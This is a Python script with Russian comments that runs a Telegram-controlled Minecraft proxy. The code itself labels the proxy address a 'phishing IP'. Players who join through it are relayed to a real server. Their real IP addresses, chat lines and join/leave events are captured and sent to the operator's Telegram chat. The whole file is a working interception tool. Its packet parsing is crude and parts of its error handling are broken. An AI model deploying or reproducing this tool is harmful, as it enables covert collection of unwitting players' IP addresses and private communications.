#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import socket
import re
import os
import requests
from datetime import datetime
from telethon import TelegramClient, events

# ======================================================
#  КОНФИГУРАЦИЯ (ДАННЫЕ БЕРУТСЯ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ)
# ======================================================

API_ID = int(os.getenv('API_ID', 123456))
API_HASH = os.getenv('API_HASH', 'your_api_hash_here')
BOT_TOKEN = os.getenv('BOT_TOKEN', 'your_bot_token_here')
PROXY_PORT = int(os.getenv('PORT', 7777))

# ======================================================

active_sessions = {}

def get_public_ip():
    """Получает внешний IP сервера"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text.strip()
    except:
        try:
            response = requests.get('https://icanhazip.com', timeout=5)
            return response.text.strip()
        except:
            return '0.0.0.0'

# ======================================================
#  TELEGRAM БОТ
# ======================================================

bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    await event.respond(
        "🤖 *Minecraft Proxy Logger*\n\n"
        "📌 Команды:\n"
        "`/log IP_сервера` - начать логирование\n"
        "`/stop` - остановить\n"
        "`/status` - статус сессии\n\n"
        "Пример: `/log funtime.su`",
        parse_mode='markdown'
    )

@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    await event.respond(
        "👑 *Команды бота:*\n\n"
        "📤 `/log IP_сервера` - создать прокси и начать логирование\n"
        "   Пример: `/log funtime.su`\n\n"
        "🛑 `/stop` - остановить текущую сессию\n\n"
        "📊 `/status` - показать статус активной сессии\n\n"
        "❓ `/help` - эта справка\n\n"
        "*Как это работает:*\n"
        "1. Ты отправляешь `/log funtime.su`\n"
        "2. Бот создает прокси-сервер и дает тебе IP для подключения\n"
        "3. Ты заходишь в Minecraft по этому IP\n"
        "4. Бот логирует ВСЕ сообщения чата и присылает их тебе сюда",
        parse_mode='markdown'
    )

@bot.on(events.NewMessage(pattern='/log (.*)'))
async def log_command(event):
    user_id = event.sender_id
    server_ip = event.pattern_match.group(1).strip()
    
    if user_id in active_sessions:
        await event.respond(
            "❌ У тебя уже есть активная сессия!\n"
            "Используй `/stop` чтобы остановить её.",
            parse_mode='markdown'
        )
        return
    
    public_ip = get_public_ip()
    phishing_ip = f"{public_ip}:{PROXY_PORT}"
    
    active_sessions[user_id] = {
        'target_server': server_ip,
        'chat': event.chat,
        'user_id': user_id,
        'started': datetime.now(),
        'messages': [],
        'phishing_ip': phishing_ip,
        'sent_messages': []
    }
    
    await event.respond(
        f"🟢 *Туннель создан!*\n\n"
        f"🌐 *IP для подключения:* `{phishing_ip}`\n"
        f"📡 *Целевой сервер:* `{server_ip}`\n\n"
        f"📝 *Инструкция:*\n"
        f"1. Открой Minecraft\n"
        f"2. Введи IP: `{phishing_ip}`\n"
        f"3. Все сообщения чата будут приходить сюда\n\n"
        f"🛑 Для остановки: `/stop`",
        parse_mode='markdown'
    )
    
    print(f"✅ Сессия {user_id}: {server_ip} → {phishing_ip}")

@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    user_id = event.sender_id
    
    if user_id not in active_sessions:
        await event.respond("❌ У тебя нет активной сессии!", parse_mode='markdown')
        return
    
    session = active_sessions[user_id]
    msg_count = len(session.get('messages', []))
    duration = (datetime.now() - session['started']).seconds // 60
    
    del active_sessions[user_id]
    
    await event.respond(
        f"🔴 *Логирование остановлено*\n\n"
        f"📊 Всего сообщений: {msg_count}\n"
        f"⏱ Длительность: {duration} мин",
        parse_mode='markdown'
    )

@bot.on(events.NewMessage(pattern='/status'))
async def status_command(event):
    user_id = event.sender_id
    
    if user_id not in active_sessions:
        await event.respond("❌ Нет активной сессии.", parse_mode='markdown')
        return
    
    session = active_sessions[user_id]
    msg_count = len(session.get('messages', []))
    duration = (datetime.now() - session['started']).seconds // 60
    
    await event.respond(
        f"📊 *Статус сессии:*\n\n"
        f"🌐 Фишинг IP: `{session['phishing_ip']}`\n"
        f"📡 Сервер: `{session['target_server']}`\n"
        f"💬 Сообщений: {msg_count}\n"
        f"⏱ Длительность: {duration} мин",
        parse_mode='markdown'
    )

# ======================================================
#  ПРОКСИ-СЕРВЕР MINECRAFT
# ======================================================

async def start_proxy_server():
    """Запускает прокси-сервер Minecraft"""
    try:
        server = await asyncio.start_server(
            handle_client,
            '0.0.0.0',
            PROXY_PORT
        )
        print(f"✅ Прокси запущен на порту {PROXY_PORT}")
        async with server:
            await server.serve_forever()
    except Exception as e:
        print(f"❌ Ошибка запуска прокси: {e}")

async def handle_client(player_reader, player_writer):
    """Обрабатывает подключение игрока"""
    
    player_ip = player_writer.get_extra_info('peername')
    print(f"📡 Новое подключение от {player_ip[0]}")
    
    if not active_sessions:
        print("❌ Нет активной сессии, закрываю соединение")
        player_writer.close()
        return
    
    user_id = list(active_sessions.keys())[0]
    session = active_sessions[user_id]
    target_server = session['target_server']
    chat = session['chat']
    
    try:
        print(f"🔄 Подключаюсь к {target_server}")
        real_reader, real_writer = await asyncio.open_connection(
            target_server, 25565
        )
        
        await chat.respond(
            f"🟢 Игрок подключился к `{target_server}`\n"
            f"🌐 Реальный IP: `{player_ip[0]}`",
            parse_mode='markdown'
        )
        
        player_to_server = asyncio.create_task(forward_data(
            player_reader, real_writer, "игрок→сервер", chat
        ))
        server_to_player = asyncio.create_task(forward_data(
            real_reader, player_writer, "сервер→игрок", chat
        ))
        
        await asyncio.gather(player_to_server, server_to_player)
        
    except Exception as e:
        print(f"❌ Ошибка прокси: {e}")
        await chat.respond(f"❌ Ошибка прокси: `{str(e)}`", parse_mode='markdown')
    finally:
        player_writer.close()
        real_writer.close()
        print("🔌 Соединение закрыто")

async def forward_data(reader, writer, direction, chat):
    """Пересылает данные между игроком и сервером"""
    try:
        while True:
            data = await reader.read(4096)
            if not data:
                break
            
            writer.write(data)
            await writer.drain()
            
            await parse_minecraft_packet(data, direction, chat)
            
    except Exception as e:
        print(f"❌ Ошибка в {direction}: {e}")

async def parse_minecraft_packet(data, direction, chat):
    """Парсит пакеты Minecraft и вытаскивает сообщения"""
    try:
        text = data.decode('utf-8', errors='ignore')
        
        chat_pattern = r'<([^>]+)>\s*(.+?)(?:\x00|$)'
        matches = re.findall(chat_pattern, text)
        
        for player, message in matches:
            session = list(active_sessions.values())[0] if active_sessions else None
            if session:
                msg_key = f"{player}:{message}"
                if msg_key not in session.get('sent_messages', []):
                    if 'sent_messages' not in session:
                        session['sent_messages'] = []
                    session['sent_messages'].append(msg_key)
                    session['messages'].append(msg_key)
                    
                    await chat.respond(
                        f"💬 *{player}*: {message}",
                        parse_mode='markdown'
                    )
                    print(f"[ЧАТ] {player}: {message}")
        
        if 'joined the game' in text:
            player = text.split('joined the game')[0].strip()
            await chat.respond(
                f"🟢 *{player}* зашел на сервер",
                parse_mode='markdown'
            )
            print(f"[ВХОД] {player}")
            
        elif 'left the game' in text:
            player = text.split('left the game')[0].strip()
            await chat.respond(
                f"🔴 *{player}* вышел с сервера",
                parse_mode='markdown'
            )
            print(f"[ВЫХОД] {player}")
            
    except:
        pass

# ======================================================
#  ЗАПУСК
# ======================================================

async def main():
    print("=" * 50)
    print("🚀 Minecraft Proxy Logger")
    print("=" * 50)
    
    public_ip = get_public_ip()
    print(f"🌐 Внешний IP: {public_ip}")
    print(f"📡 Прокси порт: {PROXY_PORT}")
    print(f"🔗 Фишинг IP: {public_ip}:{PROXY_PORT}")
    print("=" * 50)
    
    asyncio.create_task(start_proxy_server())
    
    await bot.start()
    print("✅ Telegram бот запущен!")
    print("📌 Используй команду /log <IP>")
    print("=" * 50)
    print("")
    print("💡 Подключись к прокси в Minecraft:")
    print(f"   {public_ip}:{PROXY_PORT}")
    print("")
    
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹ Бот остановлен")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
